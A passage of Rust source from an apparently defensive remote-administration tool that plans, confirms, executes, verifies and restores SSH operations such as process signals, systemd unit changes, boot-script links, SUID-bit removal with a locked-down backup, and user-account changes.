        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = match operation.verify(&self.target, &executor, journal).await {
            Ok(verification) => verification,
            Err(verification_error) => {
                return match operation.restore(&self.target, &executor, journal).await {
                    Ok(()) => Err(verification_error),
                    Err(restore_error) => Err(CoreError::validation(
                        "boot script verification",
                        format!(
                            "{verification_error}; automatic restore also failed: {restore_error}"
                        ),
                    )),
                };
            }
        };
        let restored_after_failed_verification = if verification.passed {
            false
        } else {
            operation.restore(&self.target, &executor, journal).await?;
            true
        };
        Ok(BootScriptRuntimeOutcome {
            name: plan.snapshot.name,
            action: plan.action,
            verification,
            restored_after_failed_verification,
        })
    }

    async fn boot_script_state_snapshot(
        &self,
        session: &BoundSshSession,
        name: &str,
        path: &str,
    ) -> CoreResult<Option<BootScriptStateSnapshot>> {
        if !is_valid_init_script_name(name) {
            return Err(invalid_detail_key("boot script name"));
        }
        let path = validated_absolute_path(path)?;
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                boot_script_state_command(name, &path),
                PRECONDITION_TIMEOUT,
            )
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed("boot script state", &output));
        }
        if output.exit_code == Some(44) || output.output.trim() == "ABSENT" {
            return Ok(None);
        }
        if output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("boot script state", &output));
        }
        parse_boot_script_state(&output.output, &path).map(Some)
    }

    pub async fn plan_network_disconnect(
        &self,
        session: &BoundSshSession,
        request: &NetworkDisconnectRequest,
    ) -> CoreResult<NetworkDisconnectPlan> {
        validate_network_disconnect(&request.identity)?;
        self.target.validate(session.target())?;
        let snapshot = self
            .network_connection_snapshot(session, &request.identity)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "network connection",
                id: format!(
                    "{} -> {}",
                    request.identity.local_display, request.identity.remote_display
                ),
            })?;
        self.target.validate(session.target())?;
        let mut operation = OperationPlan::new(
            session.target().clone(),
            format!(
                "断开 TCP 连接 {} → {}（状态 {}）。该操作不可恢复。",
                snapshot.local_display, snapshot.remote_display, snapshot.state
            ),
            true,
            None,
        )?;
        operation
            .metadata
            .insert("source".to_owned(), "system-info-network".to_owned());
        operation.metadata.insert(
            "connection-sha256".to_owned(),
            network_snapshot_sha256(&snapshot),
        );
        operation
            .metadata
            .insert("action".to_owned(), "disconnect".to_owned());
        Ok(NetworkDisconnectPlan {
            operation,
            identity: request.identity.clone(),
            snapshot,
        })
    }

    pub async fn execute_network_disconnect(
        &self,
        session: &BoundSshSession,
        plan: NetworkDisconnectPlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<NetworkDisconnectOutcome> {
        let executor = NetworkDisconnectExecutor {
            service: self,
            session,
            plan: &plan,
        };
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = operation.verify(&self.target, &executor, journal).await?;
        Ok(NetworkDisconnectOutcome {
            row_id: plan.identity.row_id,
            verification,
        })
    }

    async fn process_identity_snapshot(
        &self,
        session: &BoundSshSession,
        pid: u32,
    ) -> CoreResult<Option<ProcessIdentitySnapshot>> {
        self.target.validate(session.target())?;
        let command = process_identity_command(pid);
        let output = self
            .ssh
            .execute_bound(session, command, PRECONDITION_TIMEOUT)
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed("process identity", &output));
        }
        if output.exit_code == Some(44) || output.output.trim() == "ABSENT" {
            return Ok(None);
        }
        if output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("process identity", &output));
        }
        parse_process_identity(&output.output).map(Some)
    }

    async fn service_state_snapshot(
        &self,
        session: &BoundSshSession,
        unit: &str,
    ) -> CoreResult<ServiceStateSnapshot> {
        if !is_valid_unit_name(unit) {
            return Err(invalid_detail_key("systemd unit name"));
        }
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                service_snapshot_command(unit),
                PRECONDITION_TIMEOUT,
            )
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("service state snapshot", &output));
        }
        parse_service_snapshot(unit, &output.output)
    }

    async fn suid_file_snapshot(
        &self,
        session: &BoundSshSession,
        path: &RemotePath,
    ) -> CoreResult<SuidFileSnapshot> {
        validated_suid_path(path.as_str())?;
        self.remote_regular_file_snapshot(session, path).await
    }

    async fn remote_regular_file_snapshot(
        &self,
        session: &BoundSshSession,
        path: &RemotePath,
    ) -> CoreResult<SuidFileSnapshot> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                suid_snapshot_command(path),
                Duration::from_secs(30),
            )
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("SUID file snapshot", &output));
        }
        parse_suid_snapshot(path, &output.output)
    }

    async fn root_is_uid_zero(&self, session: &BoundSshSession) -> CoreResult<bool> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, root_uid_command().to_owned(), PRECONDITION_TIMEOUT)
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed("root account check", &output));
        }
        Ok(output.output.trim() == "0")
    }

    /// The account's group names, or `None` when they could not be read. Only
    /// recorded, never acted on, so a failed read does not stop the plan.
    async fn user_account_groups(
        &self,
        session: &BoundSshSession,
        username: &str,
    ) -> Option<String> {
        let output = self
            .ssh
            .execute_bound(
                session,
                user_account_groups_command(username),
                PRECONDITION_TIMEOUT,
            )
            .await
            .ok()?;
        if output.timed_out || output.exit_code != Some(0) {
            return None;
        }
        parse_user_account_groups(&output.output)
    }

    async fn user_account_snapshot(
        &self,
        session: &BoundSshSession,
        username: &str,
    ) -> CoreResult<Option<UserAccountSnapshot>> {
        if !is_valid_username(username) {
            return Err(invalid_detail_key("Linux username"));
        }
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                user_account_snapshot_command(username),
                PRECONDITION_TIMEOUT,
            )
            .await?;
        self.target.validate(session.target())?;
        if output.exit_code == Some(44) || output.output.trim() == "ABSENT" {
            return Ok(None);
        }
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("user account snapshot", &output));
        }
        parse_user_account_snapshot(&output.output).map(Some)
    }

    async fn network_connection_snapshot(
        &self,
        session: &BoundSshSession,
        identity: &NetworkConnectionIdentity,
    ) -> CoreResult<Option<NetworkConnectionSnapshot>> {
        validate_network_disconnect(identity)?;
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                network_snapshot_command(identity),
                PRECONDITION_TIMEOUT,
            )
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed("network connection snapshot", &output));
        }
        if output.exit_code == Some(44) || output.output.trim() == "ABSENT" {
            return Ok(None);
        }
        if output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("network connection snapshot", &output));
        }
        parse_network_snapshot(&output.output).map(Some)
    }
}

#[derive(Debug)]
struct ProcessSignalExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a ProcessSignalPlan,
}

impl ProcessSignalExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "process signal operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for ProcessSignalExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .process_identity_snapshot(self.session, self.plan.snapshot.pid)
            .await?;
        if observed.as_ref() != Some(&self.plan.snapshot) {
            return Err(CoreError::validation(
                "process signal precondition",
                "the process identity changed after confirmation was prepared",
            ));
        }
        self.service.target.validate(&self.plan.operation.target)?;
        let pid = shq(&self.plan.snapshot.pid.to_string());
        let command = format!(
            "p={pid}; kill -s {} -- \"$p\"",
            self.plan.signal.shell_name()
        );
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(self.session, command, PRECONDITION_TIMEOUT)
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
        Ok(ExecutionReceipt {
            summary: format!(
                "{} dispatch to PID {} with start time {}: {dispatch_summary}",
                self.plan.signal.shell_name(),
                self.plan.snapshot.pid,
                self.plan.snapshot.start_time_ticks
            ),
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let mut observed = self
            .service
            .process_identity_snapshot(self.session, self.plan.snapshot.pid)
            .await?;
        for _ in 0..20 {
            if observed.as_ref() != Some(&self.plan.snapshot) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
            observed = self
                .service
                .process_identity_snapshot(self.session, self.plan.snapshot.pid)
                .await?;
        }
        let passed = observed.as_ref() != Some(&self.plan.snapshot);
        Ok(VerificationResult {
            passed,
            // Shown to the operator as is, so it is said in their language.
            detail: if passed {
                format!(
                    "回读：确认时的进程 PID {} 已经结束。",
                    self.plan.snapshot.pid
                )
            } else {
                format!(
                    "回读：确认时的进程 PID {} 仍在运行（它可能忽略了这个信号，或还在退出中）。",
                    self.plan.snapshot.pid
                )
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        Err(CoreError::validation(
            "process signal restore",
            "process signals cannot be reversed",
        ))
    }
}

#[derive(Debug)]
struct ServiceRuntimeExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a ServiceRuntimePlan,
}

impl ServiceRuntimeExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "service runtime operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for ServiceRuntimeExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .service_state_snapshot(self.session, &self.plan.snapshot.unit)
            .await?;
        if observed != self.plan.snapshot {
            return Err(CoreError::validation(
                "service runtime precondition",
                "the systemd unit state changed after confirmation was prepared",
            ));
        }
        validate_service_runtime_precondition(&observed, self.plan.action)?;
        self.service.target.validate(&self.plan.operation.target)?;
        let unit = shq(&self.plan.snapshot.unit);
        let command = format!(
            "n={unit}; systemctl {} -- \"$n\"",
            self.plan.action.command()
        );
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(self.session, command, Duration::from_secs(30))
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
        Ok(ExecutionReceipt {
            summary: format!(
                "systemctl {} {} from snapshot {}: {dispatch_summary}",
                self.plan.action.command(),
                self.plan.snapshot.unit,
                service_snapshot_sha256(&self.plan.snapshot),
            ),
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let mut observed = self
            .service
            .service_state_snapshot(self.session, &self.plan.snapshot.unit)
            .await?;
        for _ in 0..20 {
            if service_runtime_verified(&observed, self.plan.action) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
            observed = self
                .service
                .service_state_snapshot(self.session, &self.plan.snapshot.unit)
                .await?;
        }
        let passed = service_runtime_verified(&observed, self.plan.action);
        Ok(VerificationResult {
            passed,
            // A unit systemd calls active is not proof the service works, so a
            // start says as much rather than reading like a recovery.
            detail: format!(
                "{}后回读：{} 运行状态 {} / {}，开机自启状态 {}。{}",
                self.plan.action.label(),
                observed.unit,
                observed.active_state,
                observed.sub_state,
                observed.unit_file_state,
                match (passed, self.plan.action) {
                    (false, _) => "与预期不符。",
                    (
                        true,
                        ServiceRuntimeAction::Start
                        | ServiceRuntimeAction::Restart
                        | ServiceRuntimeAction::Reload,
                    ) => "systemd 报告与预期一致；业务本身是否正常需要另行检查。",
                    (true, _) => "与预期一致。",
                },
            ),
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        let (command, applied_state, expected_state) = match self.plan.action {
            ServiceRuntimeAction::Enable => ("disable", "enabled", "disabled"),
            ServiceRuntimeAction::Disable => ("enable", "disabled", "enabled"),
            ServiceRuntimeAction::Mask => (
                "unmask",
                "masked",
                self.plan.snapshot.unit_file_state.as_str(),
            ),
            _ => {
                return Err(CoreError::validation(
                    "service runtime restore",
                    "runtime service state changes cannot be reversed automatically",
                ));
            }
        };
        let observed = self
            .service
            .service_state_snapshot(self.session, &self.plan.snapshot.unit)
            .await?;
        if observed.load_state != "loaded" {
            return Err(CoreError::validation(
                "service runtime restore",
                "the systemd unit is no longer loaded",
            ));
        }
        if observed.unit_file_state == expected_state {
            return Ok(());
        }
        if observed.unit_file_state != applied_state {
            return Err(CoreError::validation(
                "service runtime restore",
                format!(
                    "refusing to overwrite unexpected unit-file state {}",
                    observed.unit_file_state
                ),
            ));
        }
        let unit = shq(&self.plan.snapshot.unit);
        let output = self
            .service
            .ssh
            .execute_bound(
                self.session,
                format!("n={unit}; systemctl {command} -- \"$n\""),
                Duration::from_secs(30),
            )
            .await?;
        if output.timed_out || output.exit_code != Some(0) {
            return Err(command_failed("service runtime restore", &output));
        }
        let restored = self
            .service
            .service_state_snapshot(self.session, &self.plan.snapshot.unit)
            .await?;
        if restored.unit_file_state != expected_state {
            return Err(CoreError::validation(
                "service runtime restore",
                format!(
                    "expected unit-file state {expected_state}, observed {}",
                    restored.unit_file_state
                ),
            ));
        }
        Ok(())
    }
}

#[derive(Debug)]
struct BootScriptRuntimeExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a BootScriptRuntimePlan,
}

impl BootScriptRuntimeExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "boot script runtime operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }

    async fn observe(&self) -> CoreResult<BootScriptStateSnapshot> {
        self.service
            .boot_script_state_snapshot(
                self.session,
                &self.plan.snapshot.name,
                &self.plan.snapshot.path,
            )
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "boot script",
                id: bounded_text(&self.plan.snapshot.name, 128),
            })
    }

    /// Runs one of the manager's two verbs against the script.
    async fn dispatch(&self, enable: bool) -> CoreResult<String> {
        let manager = self.plan.snapshot.manager.ok_or_else(|| {
            CoreError::validation(
                "boot script runtime",
                "this host has none of rc-update, update-rc.d or chkconfig",
            )
        })?;
        let (add, remove) = manager.commands();
        let verb = if enable { add } else { remove };
        let name = shq(&self.plan.snapshot.name);
        let output = self
            .service
            .ssh
            .execute_bound(
                self.session,
                format!("n={name}; {verb}"),
                PRECONDITION_TIMEOUT,
            )
            .await;
        Ok(match output {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        })
    }
}

#[async_trait]
impl OperationExecutor for BootScriptRuntimeExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self.observe().await?;
        if observed != self.plan.snapshot {
            return Err(CoreError::validation(
                "boot script precondition",
                "the boot links or the script changed after confirmation was prepared",
            ));
        }
        validate_boot_script_precondition(&observed, self.plan.action)?;
        self.service.target.validate(&self.plan.operation.target)?;
        let enable = self.plan.action == ServiceRuntimeAction::Enable;
        let dispatch_summary = self.dispatch(enable).await?;
        Ok(ExecutionReceipt {
            summary: format!(
                "{} {} through {} from snapshot {}: {dispatch_summary}",
                self.plan.action.command(),
                self.plan.snapshot.name,
                self.plan
                    .snapshot
                    .manager
                    .map_or("none", BootScriptManager::name),
                boot_script_snapshot_sha256(&self.plan.snapshot),
            ),
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let mut observed = self.observe().await?;
        for _ in 0..10 {
            if boot_script_runtime_verified(&observed, self.plan.action) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
            observed = self.observe().await?;
        }
        let passed = boot_script_runtime_verified(&observed, self.plan.action);
        Ok(VerificationResult {
            passed,
            detail: format!(
                "{} 现在{}；启动链接：{}{}",
                observed.name,
                if observed.enabled() {
                    "在开机序列中"
                } else {
                    "不在开机序列中"
                },
                if observed.start_links.is_empty() {
                    "无".to_owned()
                } else {
                    observed.start_links.join(" ")
                },
                if passed {
                    "（已核对）"
                } else {
                    "（未通过核对）"
                },
            ),
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        let applied_enable = self.plan.action == ServiceRuntimeAction::Enable;
        let observed = self.observe().await?;
        // Already back where it started; nothing to undo.
        if observed.enabled() == self.plan.snapshot.enabled() {
            return Ok(());
        }
        // Only undo the change this plan made. Anything else on those links
        // came from somewhere else, and overwriting it would be a second
        // unrequested change on top of a failed first one.
        if observed.enabled() != applied_enable {
            return Err(CoreError::validation(
                "boot script restore",
                "the boot links are in neither the state before nor the state after this change",
            ));
        }
        self.dispatch(!applied_enable).await?;
        let restored = self.observe().await?;
        if restored.enabled() != self.plan.snapshot.enabled() {
            return Err(CoreError::validation(
                "boot script restore",
                "the boot links did not return to the state recorded before the change",
            ));
        }
        Ok(())
    }
}

#[derive(Debug, Eq, PartialEq, Serialize, Deserialize)]
struct SuidPermissionRestoreToken {
    path: RemotePath,
    backup_path: RemotePath,
    sha256: String,
    original_mode: u32,
    target_mode: u32,
    device: u64,
    inode: u64,
}

#[derive(Debug)]
struct SuidPermissionExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a SuidPermissionPlan,
}

impl SuidPermissionExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "SUID permission operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }

    fn token(&self) -> SuidPermissionRestoreToken {
        SuidPermissionRestoreToken {
            path: self.plan.snapshot.path.clone(),
            backup_path: self.plan.backup_path.clone(),
            sha256: self.plan.snapshot.sha256.clone(),
            original_mode: self.plan.snapshot.mode,
            target_mode: self.plan.target_mode,
            device: self.plan.snapshot.device,
            inode: self.plan.snapshot.inode,
        }
    }
}

#[async_trait]
impl OperationExecutor for SuidPermissionExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .suid_file_snapshot(self.session, &self.plan.snapshot.path)
            .await?;
        if observed != self.plan.snapshot {
            return Err(CoreError::validation(
                "SUID permission precondition",
                "file content, metadata, device, or inode changed after confirmation was prepared",
            ));
        }
        let command = suid_permission_apply_command(self.plan);
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(self.session, command, Duration::from_secs(120))
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
        let restore_token =
            serde_json::to_string(&self.token()).map_err(|source| CoreError::Encode {
                subject: "SUID permission restore token",
                source,
            })?;
        Ok(ExecutionReceipt {
            summary: format!(
                "permission update {} -> {:04o} with managed backup {}: {dispatch_summary}",
                self.plan.snapshot.path.as_str(),
                self.plan.target_mode,
                self.plan.backup_path.as_str(),
            ),
            restore_token: Some(restore_token),
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let token = decode_suid_restore_token(receipt)?;
        if token != self.token() {
            return Err(CoreError::validation(
                "SUID permission verification",
                "restore token does not match the immutable plan",
            ));
        }
        let current = self
            .service
            .remote_regular_file_snapshot(self.session, &token.path)
            .await?;
        let backup = self
            .service
            .remote_regular_file_snapshot(self.session, &token.backup_path)
            .await?;
        let current_matches = current.sha256 == token.sha256
            && current.mode == token.target_mode
            && current.device == token.device
            && current.inode == token.inode;
        // The copy has to hold the same bytes, and hold them where nothing can
        // run or read them. It deliberately does *not* carry the original's
        // mode or ownership any more: it used to, which is how disarming a
        // setuid-root file left a setuid-root copy of it. The original mode is
        // kept in the plan, which is where the restore reads it from.
        let backup_matches = backup.sha256 == token.sha256 && backup.mode == MANAGED_BACKUP_MODE;
        let passed = current_matches && backup_matches;
        Ok(VerificationResult {
            passed,
            detail: if passed {
                format!(
                    "回读：文件权限现为 {:04o}，仍是原来那个文件且内容未变（设备 {}，inode {}）；备份副本内容与原文件一致（SHA-256 {}）。",
                    current.mode, current.device, current.inode, backup.sha256
                )
            } else {
                format!(
                    "回读与预期不符：文件权限现为 {:04o}（设备 {}，inode {}），备份副本 SHA-256 {}。",
                    current.mode, current.device, current.inode, backup.sha256
                )
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        let token = decode_suid_restore_token(receipt)?;
        if token != self.token() {
            return Err(CoreError::validation(
                "SUID permission restore",
                "restore token does not match the immutable plan",
            ));
        }
        let current = self
            .service
            .remote_regular_file_snapshot(self.session, &token.path)
            .await?;
        if current.sha256 == token.sha256
            && current.mode == token.original_mode
            && current.device == token.device
            && current.inode == token.inode
        {
            return Ok(());
        }
        if current.sha256 != token.sha256
            || current.mode != token.target_mode
            || current.device != token.device
            || current.inode != token.inode
        {
            return Err(CoreError::validation(
                "SUID permission restore",
                "refuses to modify a file whose content, mode, device, or inode changed after execution",
            ));
        }
        let backup = self
            .service
            .remote_regular_file_snapshot(self.session, &token.backup_path)
            .await?;
        if backup.sha256 != token.sha256 || backup.mode != token.original_mode {
            return Err(CoreError::validation(
                "SUID permission restore",
                "managed backup no longer matches the confirmed snapshot",
            ));
        }
        let output = self
            .service
            .ssh
            .execute_bound(
                self.session,
                suid_permission_restore_command(&token),
                Duration::from_secs(30),
            )
            .await?;
        if output.timed_out || output.exit_code != Some(0) {
            return Err(command_failed("SUID permission restore", &output));
        }
        let restored = self
            .service
            .suid_file_snapshot(self.session, &token.path)
            .await?;
        if restored.sha256 != token.sha256
            || restored.mode != token.original_mode
            || restored.device != token.device
            || restored.inode != token.inode
        {
            return Err(CoreError::validation(
                "SUID permission restore",
                "restored file did not match the confirmed content, mode, device, and inode",
            ));
        }
        Ok(())
    }
}

fn decode_suid_restore_token(receipt: &ExecutionReceipt) -> CoreResult<SuidPermissionRestoreToken> {
    let encoded = receipt
        .restore_token
        .as_deref()
        .ok_or_else(|| CoreError::validation("SUID permission restore", "missing restore token"))?;
    serde_json::from_str(encoded).map_err(|source| CoreError::Decode {
        subject: "SUID permission restore token",
        source,
    })
}

/// What a kept copy is left at: readable and writable by its owner, and by
/// nothing else. Never executable — what gets disarmed in an incident is
/// usually the thing that was executing.
const MANAGED_BACKUP_MODE: u32 = 0o600;

/// Keeps a copy, then takes the bits off the original.
///
/// The copy is made with `cp -L` and pinned at 0600, and it used to be `cp -aL`
/// with whatever mode the original had. That meant disarming a setuid-root
/// backdoor left a **setuid-root copy of the same backdoor** on the machine —
/// the operator asked for the bits to come off and the tool quietly made a
/// second file that still had them. The 0700 directory kept other accounts
/// out, but `find / -perm -4000` still found it, which in a defence exercise is
/// the tool creating the very finding the operator is there to remove.
///
/// Nothing is lost by dropping the mode: [`suid_permission_restore_command`]
/// only ever checks the copy's content hash, and puts the original mode back
/// from the plan's own record of it.
fn suid_permission_apply_command(plan: &SuidPermissionPlan) -> String {
    let snapshot = &plan.snapshot;
    format!(
        "set -eu; p={}; d={}; b={}; expected={}; mode={}; uid={}; gid={}; dev={}; ino={}; target={}; [ -f \"$p\" ] && [ ! -L \"$p\" ] || exit 44; exec 9<\"$p\"; actual=$(sha256sum /proc/self/fd/9 | awk '{{print $1}}'); current=$(stat -Lc '%a:%u:%g:%d:%i' /proc/self/fd/9); [ \"$actual\" = \"$expected\" ] && [ \"$current\" = \"$mode:$uid:$gid:$dev:$ino\" ] || exit 42; umask 077; if [ -e \"$d\" ]; then [ -d \"$d\" ] && [ ! -L \"$d\" ] || exit 43; else install -d -m 700 -- \"$d\"; fi; [ ! -e \"$b\" ] || exit 43; cp -L -- /proc/self/fd/9 \"$b\"; [ \"$(sha256sum -- \"$b\" | awk '{{print $1}}')\" = \"$expected\" ] || {{ rm -f -- \"$b\"; exit 45; }}; chmod {} -- \"$b\"; chmod \"$target\" -- /proc/self/fd/9; printf 'APPLIED\\n'",
        shq(snapshot.path.as_str()),
        shq(plan.backup_directory.as_str()),
        shq(plan.backup_path.as_str()),
        shq(&snapshot.sha256),
        shq(&format!("{:o}", snapshot.mode)),
        shq(&snapshot.uid.to_string()),
        shq(&snapshot.gid.to_string()),
        shq(&snapshot.device.to_string()),
        shq(&snapshot.inode.to_string()),
        shq(&format!("{:o}", plan.target_mode)),
        shq(&format!("{MANAGED_BACKUP_MODE:o}")),
    )
}

fn suid_permission_restore_command(token: &SuidPermissionRestoreToken) -> String {
    format!(
        "set -eu; p={}; b={}; expected={}; target={}; original={}; dev={}; ino={}; [ -f \"$p\" ] && [ ! -L \"$p\" ] && [ -f \"$b\" ] && [ ! -L \"$b\" ] || exit 44; exec 9<\"$p\"; [ \"$(sha256sum /proc/self/fd/9 | awk '{{print $1}}')\" = \"$expected\" ] || exit 42; [ \"$(sha256sum -- \"$b\" | awk '{{print $1}}')\" = \"$expected\" ] || exit 42; [ \"$(stat -Lc '%a:%d:%i' /proc/self/fd/9)\" = \"$target:$dev:$ino\" ] || exit 42; chmod \"$original\" -- /proc/self/fd/9",
        shq(token.path.as_str()),
        shq(token.backup_path.as_str()),
        shq(&token.sha256),
        shq(&format!("{:o}", token.target_mode)),
        shq(&format!("{:o}", token.original_mode)),
        shq(&token.device.to_string()),
        shq(&token.inode.to_string()),
    )
}

#[derive(Debug)]
struct UserAccountExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a UserAccountPlan,
}

impl UserAccountExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "user account operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for UserAccountExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .user_account_snapshot(self.session, &self.plan.snapshot.username)
            .await?;
        if observed.as_ref() != Some(&self.plan.snapshot) {
            return Err(CoreError::validation(
                "user account precondition",
                "the account identity or lock state changed after confirmation was prepared",
            ));
        }
        validate_user_account_precondition(&self.plan.snapshot, self.plan.action)?;
        self.service.target.validate(&self.plan.operation.target)?;
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(
                self.session,
                user_account_dispatch_command(&self.plan.snapshot, self.plan.action),
                Duration::from_secs(20),
            )
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
        Ok(ExecutionReceipt {
            summary: format!(
                "{} {} from snapshot {}: {dispatch_summary}",
                self.plan.action.label(),
                self.plan.snapshot.username,
                user_account_snapshot_sha256(&self.plan.snapshot),
            ),
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let done = |observed: &Option<UserAccountSnapshot>| match self.plan.action {
            // `None` is only ever a definite "no such account" from getent:
            // a failed read is an error, not an absence.
            UserAccountAction::Delete => observed.is_none(),
